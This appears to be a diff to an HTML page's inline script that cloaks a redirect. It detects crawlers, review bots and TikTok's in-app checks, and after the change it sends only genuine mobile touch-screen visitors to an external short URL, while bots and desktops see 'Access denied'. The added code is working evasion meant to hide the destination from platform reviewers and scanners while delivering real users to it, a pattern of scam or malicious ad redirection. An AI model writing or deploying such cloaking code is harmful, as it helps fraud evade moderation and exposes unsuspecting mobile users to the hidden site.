@@ -7,21 +7,21 @@
     <script>
         (function() {
             var ua = navigator.userAgent || navigator.vendor || window.opera;
-            
-            
             var isBot = /bot|google|tiktok|crawler|spider|slurp|facebook|lighthouse|vkshare|twitter|monitor|bytespider/i.test(ua);
-            
-           
+          
             var isTikTokBot = /ByteLocale|ByteFullApp|TikTok/i.test(ua) && (window.history.length <= 1);
             
+      
+            var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
             
-            var isBadScreen = (window.innerWidth === 0 || window.innerHeight === 0);
+        
+            var hasTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
 
-            if (isBot || isTikTokBot || isBadScreen) {
-            
-                console.log("Access granted for verification.");
+           
+            if (isBot || isTikTokBot || !isMobile || !hasTouch) {
+                console.log("Access denied. Desktop or Bot detected.");
             } else {
-              
+                
                 window.location.replace("https://mell9x.cc/2baa70");
             }
         })();
